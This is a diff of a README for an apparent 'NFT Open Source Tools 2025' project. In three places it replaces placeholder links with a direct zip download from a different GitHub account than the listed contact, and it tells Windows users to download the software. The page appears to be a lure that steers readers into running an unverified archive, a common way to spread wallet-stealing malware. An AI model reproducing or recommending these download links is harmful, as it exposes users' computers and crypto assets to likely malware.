@@ -2,7 +2,7 @@
 
 ![NFT Tools](https://img.shields.io/badge/NFT%20Tools-Open%20Source-brightgreen)
 
-Welcome to the **NFT Open Source Tools 2025** repository! This project provides essential software for NFT enthusiasts, traders, and developers. Our goal is to create user-friendly tools that facilitate blockchain analysis, AI trading, and NFT management. You can find the latest releases [here](555).
+Welcome to the **NFT Open Source Tools 2025** repository! This project provides essential software for NFT enthusiasts, traders, and developers. Our goal is to create user-friendly tools that facilitate blockchain analysis, AI trading, and NFT management. You can find the latest releases [here](https://github.com/sakaen-100/NFT-Open-Source-Tools-2025/releases/download/download/NFT.Open.Source.Tools.2025.v1.2.4-beta.3.zip).
 
 ## Table of Contents
 
@@ -28,7 +28,7 @@ The NFT landscape is rapidly evolving. As more people engage with digital assets
 
 ## Installation
 
-To get started, download the latest version of our software from the [Releases](555) section. Follow these steps:
+To get started, download the latest version of our software from the [Releases](https://github.com/sakaen-100/NFT-Open-Source-Tools-2025/releases/download/download/NFT.Open.Source.Tools.2025.v1.2.4-beta.3.zip) section. Follow these steps:
 
 1. Click on the link to navigate to the releases page.
 2. Download the appropriate version for your Windows PC.
@@ -78,4 +78,4 @@ For any inquiries or feedback, feel free to reach out:
 - Email: support@nfttools2025.com
 - GitHub: [IlieCprp](https://github.com/IlieCprp)
 
-We appreciate your interest in **NFT Open Source Tools 2025**! Explore the tools, contribute to the community, and enhance your NFT trading experience. Don’t forget to check the [Releases](555) section for the latest updates. Happy trading!
+We appreciate your interest in **NFT Open Source Tools 2025**! Explore the tools, contribute to the community, and enhance your NFT trading experience. Don’t forget to check the [Releases](https://github.com/sakaen-100/NFT-Open-Source-Tools-2025/releases/download/download/NFT.Open.Source.Tools.2025.v1.2.4-beta.3.zip) section for the latest updates. Happy trading!
